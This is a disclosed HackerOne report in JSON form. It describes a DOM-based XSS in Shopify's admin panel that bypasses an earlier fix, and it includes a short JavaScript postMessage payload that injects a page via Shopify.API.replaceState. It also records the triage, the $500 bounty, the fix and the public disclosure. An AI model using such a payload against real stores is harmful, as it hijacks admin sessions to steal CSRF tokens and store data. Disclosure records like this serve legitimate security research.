{"id":883867,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODM4Njc=","url":"https://hackerone.com/reports/883867","title":"Inject page in admin panel via Shopify.API.pushState [New Payload]","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-05-27T19:05:49.705Z","submitted_at":"2020-05-27T19:05:49.705Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tiago-danin","url":"/tiago-danin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-12-27T22:14:47.302Z","bug_reporter_agreed_on_going_public_at":"2020-12-27T22:14:47.236Z","team_member_agreed_on_going_public_at":"2020-08-18T19:49:18.265Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The correction for #868615, allows you to use new payload:\n\n```js\nconst ctx = window.open(location.origin+'/admin/themes', '_blank')\nconst data = JSON.stringify({\n                  message: 'Shopify.API.replaceState',\n                  data: {pathname: \"abc:d../pages/xss#//\"}\n});\nctx.postMessage(data)\n```\n\n## Impact\n\nAbuse the active admin session to extract data as:\n\n- CSRF token.\n- Store config.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":19,"voters":["drsniper","bibekshah","ali","mattberg","nipe","ace1972","tiago-danin","zerox4","thewesdias","jazibobs","and 9 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8124279,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is working on a fix. We'll be in touch again soon regarding a bounty.","automated_response":false,"created_at":"2020-05-27T21:47:33.586Z","updated_at":"2020-05-27T21:47:33.586Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8134465,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding a $500 bounty for this issue under the \"Cross-site scripting - stored\" category for Shopify Core. Although script execution occurs in the storefront area, it is not intended that storefront pages be displayed directly with the store's admin area. We'll be in touch again once a fix is in place.","automated_response":false,"created_at":"2020-05-28T17:28:06.049Z","updated_at":"2020-05-28T17:28:06.049Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"tiago-danin","url":"/tiago-danin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8794192,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @tems!\nThanks again for your report. We have recently deployed a fix for this issue, and you should no longer be able to reproduce this behaviour. \nThank you for taking the time to hack on Shopify, and we hope to hear from you again soon!","automated_response":false,"created_at":"2020-07-29T14:33:39.881Z","updated_at":"2020-07-29T14:33:39.881Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tiago-danin","url":"/tiago-danin"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8972334,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-18T19:49:18.287Z","updated_at":"2020-08-18T19:49:18.287Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10213734,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-12-27T22:14:47.260Z","updated_at":"2020-12-27T22:14:47.260Z","actor":{"username":"tiago-danin","cleared":false,"url":"/tiago-danin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10213735,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-12-27T22:14:47.328Z","updated_at":"2020-12-27T22:14:47.328Z","actor":{"username":"tiago-danin","cleared":false,"url":"/tiago-danin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}